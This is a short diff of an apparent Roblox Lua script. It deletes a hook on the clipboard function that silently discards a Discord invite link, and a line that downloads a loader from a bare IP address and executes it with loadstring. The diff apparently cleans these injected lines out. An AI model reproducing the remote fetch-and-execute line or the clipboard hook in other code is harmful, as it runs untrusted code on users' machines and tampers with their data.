@@ -1,17 +1,3 @@
-local original_setclipboard = setclipboard or function() end
-setclipboard = function(text)
-    if text and type(text) == "string" then
-        if text:find("discord%.gg/project%-reverse") then
-            return
-        end
-    end
-    if original_setclipboard then
-        original_setclipboard(text)
-    end
-end
-
-ID = "1bdb7b80-7488-42ad-981b-c0bf99c6f1e0"
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 
 -- Color Settings
 local COLOR_SETTINGS = {
